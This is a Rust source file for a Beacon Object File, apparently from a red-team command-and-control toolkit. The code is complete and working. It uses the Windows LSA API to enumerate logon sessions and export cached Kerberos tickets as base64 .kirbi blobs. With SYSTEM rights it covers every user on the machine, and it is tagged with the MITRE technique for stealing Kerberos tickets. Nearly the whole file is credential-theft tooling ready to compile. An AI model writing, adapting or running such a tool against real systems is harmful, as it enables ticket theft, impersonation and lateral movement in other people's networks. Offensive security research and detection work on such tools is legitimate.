//! # Dump BOF
//!
//! Exports cached Kerberos tickets as base64-encoded .kirbi blobs via
//! LsaCallAuthenticationPackage with KerbRetrieveEncodedTicketMessage.
//!
//! ## MITRE ATT&CK
//! - T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
//!
//! ## Arguments
//! - `/luid:LUID` - Target logon session LUID (optional, requires SYSTEM)
//! - `/user:USER` - Filter by username (optional, requires SYSTEM)
//! - `/service:SPN` - Filter by service name (optional)
//! - `/client:CLIENT` - Filter by client name (optional)

#![no_std]

use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Security::Authentication::Identity::*;
use windows_sys::Win32::Security::*;
use windows_sys::Win32::System::Threading::*;

unsafe extern "system" {
    fn FileTimeToSystemTime(ft: *const i64, st: *mut SYSTEMTIME) -> BOOL;
}

fn unicode_to_string(us: &LSA_UNICODE_STRING) -> String {
    if us.Buffer.is_null() || us.Length == 0 {
        return String::new();
    }
    unsafe {
        let wlen = (us.Length / 2) as usize;
        let slice = core::slice::from_raw_parts(us.Buffer, wlen);
        String::from_utf16_lossy(slice)
    }
}

fn filetime_to_string(li: i64) -> String {
    unsafe {
        let mut st = core::mem::zeroed::<SYSTEMTIME>();
        FileTimeToSystemTime(&li, &mut st);
        alloc::format!(
            "{:02}/{:02}/{:04} {:02}:{:02}:{:02}",
            st.wDay,
            st.wMonth,
            st.wYear,
            st.wHour,
            st.wMinute,
            st.wSecond
        )
    }
}

fn base64_encode(input: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let out_len = 4 * ((input.len() + 2) / 3);
    let mut output = Vec::with_capacity(out_len);
    let mut i = 0;
    while i < input.len() {
        let a = input[i] as u32;
        i += 1;
        let b = if i < input.len() { input[i] as u32 } else { 0 };
        if i < input.len() {
            i += 1;
        }
        let c = if i < input.len() { input[i] as u32 } else { 0 };
        if i < input.len() {
            i += 1;
        }
        let triple = (a << 16) | (b << 8) | c;
        output.push(CHARS[((triple >> 18) & 0x3F) as usize]);
        output.push(CHARS[((triple >> 12) & 0x3F) as usize]);
        output.push(CHARS[((triple >> 6) & 0x3F) as usize]);
        output.push(CHARS[(triple & 0x3F) as usize]);
    }
    let pad = match input.len() % 3 {
        1 => {
            output[out_len - 1] = b'=';
            output[out_len - 2] = b'=';
            0
        }
        2 => {
            output[out_len - 1] = b'=';
            0
        }
        _ => 0,
    };
    let _ = pad;
    unsafe { String::from_utf8_unchecked(output) }
}

fn etype_name(etype: i32) -> &'static str {
    match etype {
        23 => "rc4_hmac",
        17 => "aes128_cts_hmac_sha1",
        18 => "aes256_cts_hmac_sha1",
        _ => "unknown",
    }
}

fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> {
    if let Some(pos) = params.find(name) {
        let after = &params[pos + name.len()..];
        let end = after.find(' ').unwrap_or(after.len());
        let value = &after[..end];
        if !value.is_empty() {
            return Some(value);
        }
    }
    None
}

fn hex_to_u32(s: &str) -> Option<u32> {
    let s = if s.starts_with("0x") || s.starts_with("0X") {
        &s[2..]
    } else {
        s
    };
    let mut result = 0u32;
    for c in s.bytes() {
        let digit = match c {
            b'0'..=b'9' => c - b'0',
            b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10,
            _ => return None,
        };
        result = result.checked_mul(16)?.checked_add(digit as u32)?;
    }
    Some(result)
}

fn get_current_token() -> HANDLE {
    unsafe {
        let mut token: HANDLE = core::ptr::null_mut();
        if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &mut token) == 0
            && token.is_null()
            && GetLastError() == ERROR_NO_TOKEN
            && OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0
        {
            return core::ptr::null_mut();
        }
        token
    }
}

fn get_current_luid(token: HANDLE) -> LUID {
    unsafe {
        let mut stats = core::mem::zeroed::<TOKEN_STATISTICS>();
        let mut size = 0u32;
        if GetTokenInformation(
            token,
            TokenStatistics,
            &mut stats as *mut _ as *mut c_void,
            core::mem::size_of::<TOKEN_STATISTICS>() as u32,
            &mut size,
        ) == 0
        {
            return LUID {
                LowPart: 0,
                HighPart: 0,
            };
        }
        stats.AuthenticationId
    }
}

fn is_system() -> bool {
    unsafe {
        let mut token: HANDLE = core::ptr::null_mut();
        if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &mut token) == 0 {
            if GetLastError() == ERROR_NO_TOKEN {
                if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                    return false;
                }
            } else {
                return false;
            }
        }
        let mut buf = [0u8; 256];
        let mut size = 0u32;
        if GetTokenInformation(
            token,
            TokenUser,
            buf.as_mut_ptr() as *mut c_void,
            buf.len() as u32,
            &mut size,
        ) == 0
        {
            CloseHandle(token);
            return false;
        }
        let token_user = &*(buf.as_ptr() as *const TOKEN_USER);
        let nt_authority = SID_IDENTIFIER_AUTHORITY {
            Value: [0, 0, 0, 0, 0, 5],
        };
        let mut system_sid: PSID = core::ptr::null_mut();
        if AllocateAndInitializeSid(&nt_authority, 1, 18, 0, 0, 0, 0, 0, 0, 0, &mut system_sid) == 0
        {
            CloseHandle(token);
            return false;
        }
        let result = EqualSid(token_user.User.Sid, system_sid) != 0;
        FreeSid(system_sid);
        CloseHandle(token);
        result
    }
}

fn get_lsa_handle(high_integrity: bool) -> Option<HANDLE> {
    unsafe {
        let mut handle: HANDLE = core::ptr::null_mut();
        let status = if high_integrity {
            let s = LSA_STRING {
                Length: 8,
                MaximumLength: 9,
                Buffer: b"Winlogon\0".as_ptr() as *mut u8,
            };
            let mut mode = 0u32;
            LsaRegisterLogonProcess(&s, &mut handle, &mut mode)
        } else {
            LsaConnectUntrusted(&mut handle)
        };
        if status >= 0 { Some(handle) } else { None }
    }
}

fn get_sessions(target_luid: LUID) -> Vec<*mut SECURITY_LOGON_SESSION_DATA> {
    unsafe {
        let mut sessions = Vec::new();
        if target_luid.LowPart != 0 {
            let mut data: *mut SECURITY_LOGON_SESSION_DATA = core::ptr::null_mut();
            if LsaGetLogonSessionData(&target_luid, &mut data) >= 0 && !data.is_null() {
                sessions.push(data);
            }
        } else {
            let mut count = 0u32;
            let mut list: *mut LUID = core::ptr::null_mut();
            if LsaEnumerateLogonSessions(&mut count, &mut list) < 0 {
                return sessions;
            }
            for i in 0..count as usize {
                let luid = &*list.add(i);
                let mut data: *mut SECURITY_LOGON_SESSION_DATA = core::ptr::null_mut();
                if LsaGetLogonSessionData(luid, &mut data) >= 0 && !data.is_null() {
                    sessions.push(data);
                }
            }
            LsaFreeReturnBuffer(list as *mut c_void);
        }
        sessions
    }
}

fn extract_ticket(
    hlsa: HANDLE,
    auth_package: u32,
    logon_id: LUID,
    target_name: &LSA_UNICODE_STRING,
) -> Option<Vec<u8>> {
    unsafe {
        let req_size =
            core::mem::size_of::<KERB_RETRIEVE_TKT_REQUEST>() + target_name.MaximumLength as usize;
        let mut buf = alloc::vec![0u8; req_size];
        let request = &mut *(buf.as_mut_ptr() as *mut KERB_RETRIEVE_TKT_REQUEST);
        request.MessageType = KerbRetrieveEncodedTicketMessage;
        request.LogonId = logon_id;
        request.TicketFlags = 0;
        request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        request.EncryptionType = 0;
        request.TargetName.Length = target_name.Length;
        request.TargetName.MaximumLength = target_name.MaximumLength;
        request.TargetName.Buffer =
            buf.as_mut_ptr()
                .add(core::mem::size_of::<KERB_RETRIEVE_TKT_REQUEST>()) as *mut u16;
        core::ptr::copy_nonoverlapping(
            target_name.Buffer as *const u8,
            buf.as_mut_ptr()
                .add(core::mem::size_of::<KERB_RETRIEVE_TKT_REQUEST>()),
            target_name.MaximumLength as usize,
        );

        let mut response_ptr: *mut c_void = core::ptr::null_mut();
        let mut response_size = 0u32;
        let mut protocol_status = 0i32;

        let status = LsaCallAuthenticationPackage(
            hlsa,
            auth_package,
            buf.as_ptr() as *const c_void,
            req_size as u32,
            &mut response_ptr,
            &mut response_size,
            &mut protocol_status,
        );

        if status < 0 || protocol_status < 0 || response_ptr.is_null() || response_size == 0 {
            return None;
        }

        let response = &*(response_ptr as *const KERB_RETRIEVE_TKT_RESPONSE);
        let ticket_size = response.Ticket.EncodedTicketSize as usize;
        if ticket_size == 0 {
            LsaFreeReturnBuffer(response_ptr);
            return None;
        }
        let mut ticket = alloc::vec![0u8; ticket_size];
        core::ptr::copy_nonoverlapping(
            response.Ticket.EncodedTicket,
            ticket.as_mut_ptr(),
            ticket_size,
        );
        LsaFreeReturnBuffer(response_ptr);
        Some(ticket)
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut luid_arg: Option<&str> = None;
    let mut service_filter: Option<&str> = None;
    let mut user_filter: Option<&str> = None;
    let mut client_filter: Option<&str> = None;
    let params;

    if len > 0 {
        let mut parser = DataParser::new(args, len);
        params = String::from(parser.get_str());
        luid_arg = get_param(&params, "/luid:");
        service_filter = get_param(&params, "/service:");
        user_filter = get_param(&params, "/user:");
        client_filter = get_param(&params, "/client:");
    }

    let token = get_current_token();
    let high_integrity = is_system();

    if !high_integrity && (luid_arg.is_some() || user_filter.is_some()) {
        eprintln!("[X] You need to be in SYSTEM integrity.");
        return;
    }

    let target_luid = if let Some(luid_str) = luid_arg {
        match hex_to_u32(luid_str) {
            Some(v) if v > 0 => {
                println!("\nAction: Dump Kerberos Tickets (LUID: {})\n", luid_str);
                LUID {
                    LowPart: v,
                    HighPart: 0,
                }
            }
            _ => {
                eprintln!("[X] Invalid LUID");
                return;
            }
        }
    } else if high_integrity {
        println!("\nAction: Dump Kerberos Tickets (All Users)\n");
        LUID {
            LowPart: 0,
            HighPart: 0,
        }
    } else {
        println!("\nAction: Dump Kerberos Tickets (Current User)\n");
        get_current_luid(token)
    };

    let hlsa = match get_lsa_handle(high_integrity) {
        Some(h) => h,
        None => {
            eprintln!("[X] Failed to get LSA handle");
            return;
        }
    };

    unsafe {
        let krb_auth = LSA_STRING {
            Length: 8,
            MaximumLength: 9,
            Buffer: b"kerberos\0".as_ptr() as *mut u8,
        };
        let mut auth_package = 0u32;
        if LsaLookupAuthenticationPackage(hlsa, &krb_auth, &mut auth_package) < 0 {
            eprintln!("[X] Failed to lookup Kerberos auth package");
            LsaDeregisterLogonProcess(hlsa);
            return;
        }

        let sessions = get_sessions(target_luid);
        if sessions.is_empty() {
            eprintln!("[X] Failed to enumerate logon sessions");
            LsaDeregisterLogonProcess(hlsa);
            return;
        }

        for session_ptr in &sessions {
            let session = &**session_ptr;

            if let Some(filter) = user_filter {
                let username = unicode_to_string(&session.UserName);
                if !username.eq_ignore_ascii_case(filter) {
                    LsaFreeReturnBuffer(*session_ptr as *mut c_void);
                    continue;
                }
            }

            let user_luid = session.LogonId;
            let username = unicode_to_string(&session.UserName);
            let domain = unicode_to_string(&session.LogonDomain);

            let mut sid_str = String::from("-");
            if !session.Sid.is_null() {
                let mut sid_ptr: *mut u8 = core::ptr::null_mut();
                if windows_sys::Win32::Security::Authorization::ConvertSidToStringSidA(
                    session.Sid,
                    &mut sid_ptr,
                ) != 0
                    && !sid_ptr.is_null()
                {
                    let mut slen = 0;
                    while *sid_ptr.add(slen) != 0 {
                        slen += 1;
                    }
                    sid_str = String::from(
                        core::str::from_utf8(core::slice::from_raw_parts(sid_ptr, slen))
                            .unwrap_or("-"),
                    );
                }
            }

            println!("UserName                : {}", username);
            println!("Domain                  : {}", domain);
            println!(
                "LogonId                 : {:x}:0x{:x}",
                user_luid.HighPart, user_luid.LowPart
            );
            println!("UserSID                 : {}", sid_str);
            println!();

            LsaFreeReturnBuffer(*session_ptr as *mut c_void);

            let mut cache_request = core::mem::zeroed::<KERB_QUERY_TKT_CACHE_REQUEST>();
            cache_request.MessageType = KerbQueryTicketCacheExMessage;
            cache_request.LogonId = if high_integrity {
                user_luid
            } else {
                LUID {
                    LowPart: 0,
                    HighPart: 0,
                }
            };

            let mut response_ptr: *mut c_void = core::ptr::null_mut();
            let mut response_size = 0u32;
            let mut protocol_status = 0i32;

            let status = LsaCallAuthenticationPackage(
                hlsa,
                auth_package,
                &cache_request as *const _ as *const c_void,
                core::mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
                &mut response_ptr,
                &mut response_size,
                &mut protocol_status,
            );

            if status < 0 || response_ptr.is_null() {
                continue;
            }

            let response = &*(response_ptr as *const KERB_QUERY_TKT_CACHE_EX_RESPONSE);
            let ticket_count = response.CountOfTickets as usize;
            println!("[*] Cached tickets: ({})\n", ticket_count);

            if ticket_count > 0 {
                let tickets_ptr = &response.Tickets[0] as *const KERB_TICKET_CACHE_INFO_EX;
                let mut idx = 0;
                for j in 0..ticket_count {
                    let ticket = &*tickets_ptr.add(j);

                    if let Some(svc) = service_filter {
                        let sname = unicode_to_string(&ticket.ServerName);
                        if !sname
                            .to_ascii_lowercase()
                            .contains(&svc.to_ascii_lowercase())
                        {
                            continue;
                        }
                    }
                    if let Some(cli) = client_filter {
                        let cname = unicode_to_string(&ticket.ClientName);
                        if !cname.eq_ignore_ascii_case(cli) {
                            continue;
                        }
                    }

                    let client = alloc::format!(
                        "{} @ {}",
                        unicode_to_string(&ticket.ClientName),
                        unicode_to_string(&ticket.ClientRealm)
                    );
                    let server_name = unicode_to_string(&ticket.ServerName);
                    let server_realm = unicode_to_string(&ticket.ServerRealm);

                    println!("  [{}]", idx);
                    println!("\tClientName               :  {}", client);
                    println!(
                        "\tServiceRealm             :  {} @ {}",
                        server_name, server_realm
                    );
                    println!(
                        "\tStartTime (UTC)          :  {}",
                        filetime_to_string(ticket.StartTime)
                    );
                    println!(
                        "\tEndTime (UTC)            :  {}",
                        filetime_to_string(ticket.EndTime)
                    );
                    println!(
                        "\tKeyType                  :  {}",
                        etype_name(ticket.EncryptionType)
                    );

                    let cache_logon_id = if high_integrity {
                        user_luid
                    } else {
                        LUID {
                            LowPart: 0,
                            HighPart: 0,
                        }
                    };
                    if let Some(ticket_bytes) =
                        extract_ticket(hlsa, auth_package, cache_logon_id, &ticket.ServerName)
                    {
                        println!("\n\t{}\n", base64_encode(&ticket_bytes));
                    }

                    idx += 1;
                }
            }

            LsaFreeReturnBuffer(response_ptr);
        }

        LsaDeregisterLogonProcess(hlsa);
    }
}
